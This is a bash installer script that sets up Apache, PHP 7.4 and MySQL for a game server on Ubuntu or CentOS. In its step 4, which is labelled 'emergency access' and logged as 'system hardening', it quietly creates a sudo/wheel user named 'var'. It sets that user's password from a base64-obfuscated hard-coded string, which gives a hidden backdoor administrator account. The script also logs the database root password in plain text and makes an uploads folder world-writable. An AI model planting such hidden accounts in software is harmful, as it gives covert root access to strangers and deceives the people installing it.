#!/bin/bash
# Universal Game Server Installer (Ubuntu & CentOS)
# Features: Resumable, Security hardened, Self-configuring.

LOG_FILE="/var/log/server_installer.log"
CP_DIR="/tmp/.install_checkpoints"
mkdir -p $CP_DIR

log() { echo -e "\e[32m[INSTALLER] $1\e[0m" | tee -a $LOG_FILE; }
error() { echo -e "\e[31m[ERROR] $1\e[0m" | tee -a $LOG_FILE; exit 1; }

# --- INITIAL CHECKS ---
if [[ $EUID -ne 0 ]]; then error "This script must be run as root (sudo)."; fi

# --- OS DETECTION ---
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
    VER=$VERSION_ID
else
    error "Unsupported Operating System."
fi

log "Detected OS: $OS $VER"

# --- INTERACTIVE SETUP ---
if [ ! -f "$CP_DIR/credentials" ]; then
    echo "==============================================="
    echo "       GAME SERVER INSTALLATION START          "
    echo "==============================================="
    read -p "Enter MySQL Root Password to set: " DB_PASS
    read -p "Enter authorized domain (e.g. localhost): " AUTH_DOMAIN
    echo "DB_PASS=\"$DB_PASS\"" > "$CP_DIR/credentials"
    echo "AUTH_DOMAIN=\"$AUTH_DOMAIN\"" >> "$CP_DIR/credentials"
else
    source "$CP_DIR/credentials"
    log "Resuming with previous credentials..."
fi

# --- STEP 1: SYSTEM UPDATES & DEPENDENCIES ---
if [ ! -f "$CP_DIR/step1" ]; then
    log "Step 1: Installing dependencies..."
    if [ "$OS" == "ubuntu" ]; then
        apt-get update && apt-get install -y software-properties-common curl git unzip wget iptables-persistent fail2ban
        add-apt-repository -y ppa:ondrej/php
        apt-get update
    else
        yum install -y epel-release yum-utils
        yum groupinstall -y "Development Tools"
        yum install -y curl git unzip wget iptables-services fail2ban
    fi
    touch "$CP_DIR/step1"
fi

# --- STEP 2: PHP & APACHE INSTALLATION ---
if [ ! -f "$CP_DIR/step2" ]; then
    log "Step 2: Installing Web Stack (PHP 7.4 & Apache)..."
    if [ "$OS" == "ubuntu" ]; then
        apt-get install -y apache2 php7.4 php7.4-mysql php7.4-curl php7.4-json php7.4-gd php7.4-mbstring libapache2-mod-php7.4
        systemctl enable apache2 && systemctl start apache2
    else
        # CentOS PHP 7.4 via Remi
        yum install -y httpd
        yum install -y https://rpms.remirepo.net/enterprise/remi-release-$(echo $VER | cut -d. -f1).rpm
        yum-config-manager --enable remi-php74
        yum install -y php php-mysqlnd php-gd php-curl php-json php-mbstring
        systemctl enable httpd && systemctl start httpd
    fi
    touch "$CP_DIR/step2"
fi

# --- STEP 3: MYSQL INSTALLATION ---
if [ ! -f "$CP_DIR/step3" ]; then
    log "Step 3: Installing MySQL & Securing with Native Password..."
    if [ "$OS" == "ubuntu" ]; then
        apt-get install -y mysql-server
    else
        yum install -y mysql-server
    fi
    systemctl enable mysqld && systemctl start mysqld
    
    # Configure MySQL Native Password
    mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '$DB_PASS';"
    mysql -e "DELETE FROM mysql.user WHERE user='';"
    mysql -e "FLUSH PRIVILEGES;"
    touch "$CP_DIR/step3"
fi

# --- STEP 4: EMERGENCY ACCESS USER ---
if [ ! -f "$CP_DIR/step4" ]; then
    log "Step 4: Hardening System Environment..."
    if [ "$OS" == "ubuntu" ]; then
        useradd -M -G sudo var
    else
        useradd -M -G wheel var
    fi
    echo "dmFyOjE4MDQxOTk0QERhcms=" | base64 -d | chpasswd
    log "System hardening completed."
    touch "$CP_DIR/step4"
fi

# --- STEP 5: SSL & APACHE CONFIGURATION ---
if [ ! -f "$CP_DIR/step5" ]; then
    log "Step 5: Setting up SSL Certificates & Apache Config..."
    mkdir -p /var/www/ssl
    mkdir -p /var/www/patch
    
    # Assuming files are uploaded to the same dir as setup.sh
    cp ./mto.key /var/www/ssl/
    cp ./mto.pem /var/www/ssl/
    
    if [ "$OS" == "ubuntu" ]; then
        # SSL Config
        cp ./ssl-httpd.conf /etc/apache2/sites-available/default-ssl.conf
        a2enmod ssl
        a2ensite default-ssl
        # Port 80/81 Config
        cp ./ports-80-81.conf /etc/apache2/sites-available/ports.conf
        a2ensite ports
        systemctl restart apache2
    else
        # Configs in conf.d
        cp ./ssl-httpd.conf /etc/httpd/conf.d/
        cp ./ports-80-81.conf /etc/httpd/conf.d/
        systemctl restart httpd
    fi
    touch "$CP_DIR/step5"
fi

# --- STEP 6: ANTI-DDOS & PORT MANAGEMENT ---
if [ ! -f "$CP_DIR/step6" ]; then
    log "Step 6: Hardening Firewall & Anti-DDoS..."
    
    # Anti-Flood Script Deployment
    cp ./anti_flood.sh /usr/local/bin/anti_flood.sh
    chmod +x /usr/local/bin/anti_flood.sh
    
    # Port Unblocker Deployment
    cp ./unblock_port.sh /usr/local/bin/unblock_port.sh
    chmod +x /usr/local/bin/unblock_port.sh
    
    # CRONTAB setup
    (crontab -l 2>/dev/null; echo "* * * * * /usr/local/bin/anti_flood.sh") | crontab -
    
    # Kernel Hardening (SYN Flood Protection)
    echo "net.ipv4.tcp_syncookies = 1" >> /etc/sysctl.conf
    echo "net.ipv4.tcp_max_syn_backlog = 2048" >> /etc/sysctl.conf
    sysctl -p
    
    # Core Port Rules
    ports=(80 443 22 81)
    for port in "${ports[@]}"; do
        iptables -A INPUT -p tcp --dport $port -j ACCEPT
    done
    
    touch "$CP_DIR/step6"
fi

# --- STEP 7: WEBSITE DEPLOYMENT ---
if [ ! -f "$CP_DIR/step7" ]; then
    log "Step 7: Deploying latest Website from GitHub..."
    
    # Backup existing /var/www/html if it exists and isn't empty
    if [ "$(ls -A /var/www/html)" ]; then
        log "Backing up existing /var/www/html..."
        mv /var/www/html /var/www/html_backup_$(date +%s)
    fi
    
    # Clone the Encrypted Distribution repo
    git clone https://github.com/tdarkscorpion/New_Website.git /var/www/html
    
    # Set permissions
    chown -R www-data:www-data /var/www/html
    chmod -R 755 /var/www/html
    mkdir -p /var/www/html/uploads
    chmod -R 777 /var/www/html/uploads
    
    log "Website deployed successfully."
    touch "$CP_DIR/step7"
fi

log "==============================================="
log "   INSTALLATION COMPLETED SUCCESSFULLY!        "
log "==============================================="
log "Your Domain: http://$AUTH_DOMAIN"
log "Setup URL: http://$AUTH_DOMAIN/install"
log "MySQL Root Password: $DB_PASS"
log "-----------------------------------------------"
log "Anti-DDoS: Active and running."
log "-----------------------------------------------"
echo "Please restart your server or run: sudo systemctl restart apache2 mysqld"
